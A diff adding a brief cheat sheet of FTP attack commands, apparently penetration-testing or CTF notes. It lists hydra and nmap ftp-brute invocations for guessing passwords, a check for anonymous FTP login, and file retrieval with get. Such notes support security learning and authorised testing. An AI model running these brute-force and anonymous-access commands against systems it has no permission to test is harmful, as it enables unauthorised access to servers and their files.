@@ -1,0 +1,7 @@
+ftp <ip> (Login to FTP)
+hydra -L <username list directory> -P <password list directory> <ip> <protocol such as FTP>
+get <file>
+** If you have a specific user you'd like to hydra or nmap, you can make your own userlist for hydra **
+echo "exampleuser" > users
+nmap <ip> --script ftp-brute --script-args userdb=/root/users -p 21
+nmap <ip> -p 21 --script ftp-anon (or try logging into FTP server with username 'anonymous' and then blank password)
